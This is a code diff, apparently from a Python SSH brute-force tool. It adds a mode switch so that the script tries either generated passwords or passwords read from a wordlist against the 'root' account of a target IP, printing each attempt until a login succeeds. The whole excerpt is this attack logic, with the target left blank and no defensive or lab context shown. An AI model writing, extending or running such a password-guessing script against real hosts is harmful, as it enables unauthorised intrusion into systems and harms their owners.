@@ -36,11 +36,17 @@ def read_wordlist() -> list:
     passwords = [password.replace("\n", "") for password in passwords]
     return passwords
 
-def main():
+def main(type : str):
     ip = ""
     username = "root"
-    for i in range(1,1000):
-        # passwords = generate_password(i)
+    if type == "generate":
+        for i in range(1,1000):
+            passwords = generate_password(i)
+            for password in passwords:
+                print("Trying password {}".format(password))
+                if ssh_connection(ip, username, password):
+                    break
+    elif type == "read":
         passwords = read_wordlist()
         for password in passwords:
             print("Trying password {}".format(password))
